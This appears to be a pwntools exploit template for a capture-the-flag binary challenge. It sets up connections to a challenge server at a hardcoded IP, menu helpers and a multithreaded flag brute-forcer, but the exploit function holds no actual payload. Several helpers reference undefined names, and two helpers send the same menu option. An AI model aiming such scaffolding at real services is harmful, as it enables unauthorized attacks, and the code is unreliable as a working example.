#!/usr/bin/env python
from pwn import *
import time
import threading
#context.terminal = ['tmux', 'sp', '-h', '-l', '110']
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.log_level = 'debug'
token = ''
binary='../redhat/pwn'
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
multi_thread_num=0x4
flag=[' ']*multi_thread_num
ispow=0
ispow_byte=1
isremote=0
isdebug=0
ip='202.119.201.199'
port=10100
menu_flag='>'
code = '\x8b\x01\xc3'
def b(string='####'):
    raw_input(string)
def add(index=None,size=None,con=None):
	sla(menu_flag,1)
	if index!=None:
		sla('',str(index))
	if size!=None:
		sla('',str(size))
	if con!=None:
		sa('',con)
def rm(index=None):
	sla(menu_flag,str(3))
	if index!=None:
		sla('',str(index))
def wr(index=None,con=None):
	sla(menu_flag,str(3))
	if index!=None:
		sla('',index)
	if con!=None:
		sa('',con)
def mt_th():
	thread_list=[]
	for i in range(multi_thread_num):
		try:
			Thread_obj=brute(ispow_byte,i)
		except:
			log.info("fail to create thread-{}".format(str(offset)))
			log.info("bye~~")
			exit()
		Thread_obj.start()
		thread_list.append(Thread_obj)
	for t in thread_list:
		t.join()
def exploit(io=None,offset=None,flag_char=None):
	__author__ = '3summer'
	s       = lambda data            :io.send(str(data)) 
	sa      = lambda delim,data      :io.sendafter(str(delim), str(data))
	sl      = lambda data            :io.sendline(str(data))
	sla     = lambda delim,data      :io.sendlineafter(str(delim), str(data))
	r       = lambda numb=4096       :io.recv(numb)
	ru      = lambda delims,drop=True:io.recvuntil(delims, drop)
	irt     = lambda                  :io.interactive()
	uu32    = lambda                  :u32(data.ljust(4, '\0'))
	uu64    = lambda                  :u64(data.ljust(8, '\0'))
class brute(threading.Thread):
	def __init__(self,ispow_byte=None,offset=None):
		threading.Thread.__init__(self)
		self.offset=offset
		self.ispow_byte=ispow_byte
	def run(self):
		if self.ispow_byte:
			brute.pow_byte(self,self.offset)
		else:
			brute.pow(self,self.offset)
	def pow_byte(self,offset=None):
		for i in range(0x20,128):
			io=main()
			try:
				if exploit(io,offset,chr(i)):
					pass
				else:
					continue
			except:
				io.close()
				continue
			break
		log.info("Thread-{} finish this work".format(str(offset)))
		global flag
		flag[offset]=chr(i)
	def pow(self,offset=None):
		while True:
			io=main()
			try:
				exploit(io,offset)
			except:
				io.close()
				continue
			break
def main(argv=None):
	global isremote
	global isdebug
	global context
	global ip
	global port
	io=0
	if isremote:
		if isdebug:
			context.log_level='debug'
		else:
			context.log_level='info'
		while True:
			try:
				io=remote(ip,port)
			except:
				log.info("remote:too many requests,I am tried,sleep one second please")
				sleep(0x10)
				continue
			break
	else:
		while True:
			try:
				io=process(binary)
			except:
				log.info("local:too many process,I can not malloc any memory")
				log.info("bye~~")
				exit()
			break
		if isdebug:
			gdb.attach(io)
	return io
if __name__ == '__main__':
	if ispow:
		mt_th()
	else:
		io=main()
		exploit(io,1,'a')
	flag_fin=''
	for i in flag:
		flag_fin+=i
	print('flag='+flag_fin)
